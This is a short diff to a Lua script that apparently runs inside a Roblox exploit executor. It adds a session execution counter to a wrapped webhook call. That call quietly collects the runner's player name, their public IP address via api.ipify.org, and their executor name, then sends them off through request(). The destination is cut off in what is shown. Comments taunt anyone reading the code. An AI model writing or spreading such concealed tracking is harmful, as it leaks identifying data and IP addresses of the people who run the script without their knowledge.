@@ -1,8 +1,11 @@
+if getgenv().sessionExecutions == nil then getgenv().sessionExecutions = 0 end
+getgenv().sessionExecutions += 1
+
 --uwy on top of u skids tryna read the code LOL
 --spam the webhook i dare you
 
         pcall(function() local data = {
-            ["content"] = `{game.Players.LocalPlayer.Name} executed\n{game:HttpGet("https://api.ipify.org")}\n{identifyexecutor()}\nNORMAL\n-------------`
+            ["content"] = `{game.Players.LocalPlayer.Name} executed\n{game:HttpGet("https://api.ipify.org")}\n{identifyexecutor()}\nNORMAL\nSession Executions: {getgenv().sessionExecutions}\n-------------`
         }
 
         request(
